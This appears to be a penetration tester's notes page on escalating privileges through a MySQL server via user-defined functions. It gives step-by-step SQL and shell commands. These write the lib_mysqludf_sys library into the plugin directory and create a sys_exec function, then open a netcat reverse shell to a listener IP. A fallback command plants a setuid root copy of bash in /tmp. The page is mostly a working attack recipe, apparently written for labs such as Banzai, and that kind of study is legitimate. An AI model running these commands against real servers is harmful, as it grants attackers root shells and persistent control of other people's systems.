# MySQL User Defined Function

If we find root credentials to an internal mysql server it is game over.&#x20;

Once we log in, we need to locate plugin paths and see if the secure file priv is null so that we can load data into the database.&#x20;

```
show variables like '%plugin%';
```

![](<../../../../../.gitbook/assets/image (77).png>)

Take note of the plugin directory.&#x20;

```
show variables like '%secure_file_priv%';
```

![](<../../../../../.gitbook/assets/image (45).png>)

Make sure that this one is null, otherwise this shit is not vulnerable because we won't be able to load data.&#x20;

Now literally just follow this.

```
# Local method
use mysql;
create table tranilment(line blob);
insert into tranilment values(load_file('/tmp/lib_mysqludf_sys_64.so'));
select * from tranilment into dumpfile '/<plugin_dir>/lib_mysqludf_sys_64.so';
create function sys_exec returns integer soname 'lib_mysqludf_sys_64.so';
select sys_exec('nc <listener_ip> 1234 -e /bin/bash');
```

You should get a reverse shell. If by any reason there is a firewall blocking you from outbound connections ok not an issue.&#x20;

Try this:

```
 select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
```

Here are some articles to help you out:&#x20;

{% embed url="https://medium.com/r3d-buck3t/privilege-escalation-with-mysql-user-defined-functions-996ef7d5ceaf" %}

{% embed url="https://michmich.eu/Cheatsheets/internal/04-lpe-linux/" %}

{% embed url="https://github.com/rapid7/metasploit-framework/tree/master/data/exploits/mysql" %}
This is the exploit download based on arch&#x20;
{% endembed %}

Sometimes it'll give you an error because there is an issue doing the dumpfile process.&#x20;

{% embed url="https://www.root-me.org/?id_thread=5072&page=forum" %}

This is to troubleshoot it, just literally copy .so file into the plugin directory manually via the command line.&#x20;

{% embed url="https://emarcel.com/mysql-error-when-creating-function/" %}

<details>

<summary>Examples: </summary>

[https://lyethar.gitbook.io/banzai/priv-escalation](https://lyethar.gitbook.io/banzai/priv-escalation) Banzai

</details>
